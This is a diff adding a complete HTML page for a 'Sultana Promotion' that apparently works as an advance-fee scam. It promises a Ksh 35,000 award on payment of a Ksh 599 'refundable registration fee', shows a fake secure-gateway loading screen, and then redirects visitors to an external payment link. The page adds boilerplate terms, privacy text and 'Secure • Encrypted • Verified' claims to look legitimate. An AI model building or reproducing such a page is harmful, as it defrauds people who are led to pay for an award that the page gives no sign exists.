@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sultana Promotion</title>
+
+<style>
+body{
+  font-family: Arial, sans-serif;
+  background: linear-gradient(180deg,#a8d65e,#5fa83c);
+  padding:20px;
+}
+.container{
+  max-width:420px;
+  margin:auto;
+  background:#fff;
+  border-radius:14px;
+  box-shadow:0 6px 15px rgba(0,0,0,.15);
+  overflow:hidden;
+}
+.header{
+  background:#2e7d32;
+  color:#fff;
+  padding:18px;
+  text-align:center;
+  font-size:18px;
+  font-weight:bold;
+}
+.sub{ font-size:13px; margin-top:4px; }
+.content{ padding:20px; }
+.row{
+  display:flex;
+  justify-content:space-between;
+  margin-bottom:12px;
+}
+.divider{
+  height:2px;
+  background:#2e7d32;
+  margin:15px 0;
+}
+.total{ font-weight:bold; color:#2e7d32; }
+.note{
+  background:#fff8e1;
+  border-left:5px solid #fbc02d;
+  padding:14px;
+  font-size:14px;
+  margin-top:20px;
+}
+.buttons{
+  display:flex;
+  gap:10px;
+  margin-top:25px;
+}
+button{
+  flex:1;
+  padding:14px;
+  border:none;
+  border-radius:30px;
+  font-size:15px;
+  cursor:pointer;
+}
+.cancel{ background:#e0e0e0; }
+.proceed{ background:#2e7d32; color:#fff; }
+.center{ text-align:center; }
+.hidden{ display:none; }
+
+.loader{
+  border:4px solid #eee;
+  border-top:4px solid #2e7d32;
+  border-radius:50%;
+  width:40px;
+  height:40px;
+  margin:20px auto;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{
+  0%{ transform:rotate(0deg); }
+  100%{ transform:rotate(360deg); }
+}
+
+.payment-box{
+  background:#f9f9f9;
+  border-radius:10px;
+  padding:15px;
+  margin-top:15px;
+  font-size:14px;
+}
+
+.copy-btn{
+  background:#2e7d32;
+  color:#fff;
+  padding:10px;
+  border:none;
+  border-radius:20px;
+  margin-top:10px;
+  width:100%;
+}
+
+.success{
+  color:#2e7d32;
+  font-size:18px;
+  font-weight:bold;
+}
+.small{ font-size:13px; color:#555; }
+
+.terms{ margin-top:15px; font-size:13px; }
+
+.receipt{
+  background:#f1f8f4;
+  border:1px dashed #2e7d32;
+  border-radius:10px;
+  padding:15px;
+  margin-top:15px;
+  font-size:13px;
+}
+
+/* DOWNLOAD SUCCESS */
+.download-msg{
+  margin-top:12px;
+  font-size:14px;
+  color:#2e7d32;
+  font-weight:bold;
+}
+
+/* MODAL */
+.modal{
+  position:fixed;
+  top:0; left:0;
+  width:100%; height:100%;
+  background:rgba(0,0,0,.6);
+  display:none;
+  align-items:center;
+  justify-content:center;
+  z-index:999;
+}
+.modal-box{
+  background:#fff;
+  max-width:420px;
+  padding:20px;
+  border-radius:12px;
+  font-size:13px;
+}
+.close{
+  text-align:right;
+  font-weight:bold;
+  cursor:pointer;
+  color:#2e7d32;
+}
+
+.footer{
+  text-align:center;
+  font-size:12px;
+  color:#fff;
+  margin-top:20px;
+}
+.footer a{
+  color:#fff;
+  text-decoration:underline;
+  margin:0 6px;
+}
+
+/* subtle button feedback */
+.proceed:active{ transform:scale(0.98); }
+.copy-btn:active{ transform:scale(0.97); }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<!-- PAGE 1 -->
+<div id="page-confirm">
+  <div class="header">
+    Confirm Payment
+    <div class="sub">Complete your Sultana Promotion registration</div>
+  </div>
+
+  <div class="content">
+    <div class="note" style="background:#eef7ec;border-left:5px solid #2e7d32;">
+  <strong>⚡ Application Status: Submitted</strong><br>
+  Your application details have been received.<br>
+  Proceed with registration to continue verification and processing.
+</div>
+    <div class="row"><span>Award Amount:</span><strong>Ksh 35,000</strong></div>
+    <div class="row"><span>Registration Fee:</span><strong>Ksh 599</strong></div>
+    <div class="row"><span>Tax (0%):</span><strong>Ksh 0.00</strong></div>
+
+    <div class="divider"></div>
+
+    <div class="row total">
+      <span>Total Amount Disbursed:</span><span>Ksh 35,000</span>
+    </div>
+
+    <div class="note">
+      <strong>Note:</strong><br>
+      Registration fee is refundable upon successful award processing.
+    </div>
+
+    <div class="terms">
+      <label>
+        <input type="checkbox" id="termsCheck">
+        I agree to the <a href="#" onclick="openModal('termsModal')">Terms</a> &
+        <a href="#" onclick="openModal('privacyModal')">Privacy Policy</a>
+      </label>
+    </div>
+
+    <div class="buttons">
+      <button class="cancel">Cancel</button>
+      <button class="proceed" onclick="goPayment()">Proceed to Payment</button>
+    </div>
+  </div>
+</div>
+
+<!-- PAGE 2.5 PROCESSING -->
+<div id="page-processing" class="hidden">
+  <div class="header">Processing Payment</div>
+  <div class="content center">
+
+    <div class="loader"></div>
+
+<h3>Connecting to secure payment gateway...</h3>
+<p class="small">
+Please wait 5–10 seconds.<br>
+Do not press back or close this page.
+</p>
+  </div>
+</div>
+
+<div class="footer">
+  Secure • Encrypted • Verified <br>
+  <a href="#" onclick="openModal('privacyModal')">Privacy Policy</a> |
+  <a href="#" onclick="openModal('termsModal')">Terms</a> |
+  <a href="https://wa.me/254756296341" target="_blank">Contact</a>
+</div>
+
+<!-- TERMS MODAL -->
+<div id="termsModal" class="modal">
+  <div class="modal-box">
+    <div class="close" onclick="closeModal('termsModal')">✖</div>
+    <strong>Terms & Conditions</strong><br><br>
+    This promotion is subject to verification. Registration fees are processed
+    to validate applicant eligibility. Disbursement is carried out upon
+    successful confirmation and compliance with program guidelines.
+  </div>
+</div>
+
+<!-- PRIVACY MODAL -->
+<div id="privacyModal" class="modal">
+  <div class="modal-box">
+    <div class="close" onclick="closeModal('privacyModal')">✖</div>
+    <strong>Privacy Policy</strong><br><br>
+    We respect your privacy. Information submitted is used solely for
+    verification and communication purposes and is not shared with third
+    parties without consent.
+  </div>
+</div>
+
+<script>
+function goPayment(){
+  if(!document.getElementById("termsCheck").checked){
+    alert("Please accept Terms & Privacy Policy.");
+    return;
+  }
+
+  document.getElementById("page-confirm").classList.add("hidden");
+  document.getElementById("page-processing").classList.remove("hidden");
+
+setTimeout(function(){
+  window.location.href =
+  "https://short.payhero.co.ke/s/QcHu7bdSLBmug95qiWbSeR";
+}, 2000);
+}
+
+function openModal(id){
+  document.getElementById(id).style.display="flex";
+}
+
+function closeModal(id){
+  document.getElementById(id).style.display="none";
+}
+</script>
+</body>
+</html>
